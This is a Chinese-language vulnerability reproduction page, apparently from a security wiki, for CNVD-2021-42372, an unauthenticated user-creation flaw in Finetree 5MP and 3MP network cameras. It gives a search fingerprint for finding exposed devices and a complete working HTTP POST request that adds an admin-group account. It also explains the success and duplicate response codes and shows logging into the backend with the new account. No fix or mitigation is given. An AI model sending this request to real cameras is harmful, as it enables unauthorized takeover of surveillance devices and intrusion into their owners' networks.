---
title: "Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372"
date: 2026-10-18 09:14:30
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Finetree"
tags:
  - "Finetree"
  - "未授权访问"
  - "CNVD-2021-42372"
  - "漏洞复现"
---
## 漏洞描述

Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限

## 漏洞影响

```
Finetree 5MP
Finetree 3MP
```

## 网络测绘

```
app="Finetree-5MP-Network-Camera"
```

## 漏洞复现

登录页面

![image-20220519162837184](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191628247.png)

存在漏洞的文件 user_pop.php

![image-20220519163003628](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191630679.png)

```
POST /quicksetup/user_update.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=fn4qnpv5c8a2jgvf53vs1gufm6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
```

可以Burpsuite发送POST请求

![image-20220519163205310](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191632366.png)

或者HackBar发送POST请求，返回200即为添加成功，返回804则为用户重复

![image-20220519163124031](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191631102.png)

利用添加的账户可以登录后台

![image-20220519163442946](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191634048.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Finetree-5MP-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-CNVD-2021-42372.md)
